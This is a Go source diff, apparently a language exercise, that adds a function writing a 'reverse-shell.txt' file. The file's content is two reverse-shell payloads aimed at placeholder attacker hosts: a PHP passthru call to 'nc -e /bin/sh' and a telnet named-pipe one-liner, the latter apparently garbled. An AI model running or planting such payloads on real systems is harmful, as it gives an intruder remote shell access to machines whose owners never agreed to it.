@@ -1,7 +1,9 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
+	"log"
 	"os"
 	"time"
 )
@@ -132,7 +134,7 @@ type House struct {
 	NoRooms int
 	Price   int
 	City    string
-	Roomie  Room
+	Roomie  Room //composition
 }
 
 type Room struct {
@@ -170,4 +172,25 @@ func filer() {
 	} else {
 		fmt.Printf("Error checking file: %v\n", err)
 	}
+}
+
+func writeToFile() {
+	file, err := os.Create("reverse-shell.txt")
+	if err != nil {
+		log.Fatal(err)
+		return
+	}
+	defer file.Close()
+	//using bufio
+	writer := bufio.NewWriter(file)
+	data := "for php:\n<?php\n\t\tpassthru('nc -e /bin/sh attcking_ip 80');\n?>"
+	_, err = writer.Write([]byte(data))
+	if err != nil {
+		log.Fatal(err)
+	}
+	writer.Flush()
+	fmt.Println("Data succesfully written to file")
+
+	file.Write([]byte("\n\nfor telnet:\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n"))
+	fmt.Println("Data succesfully written to file")
 }
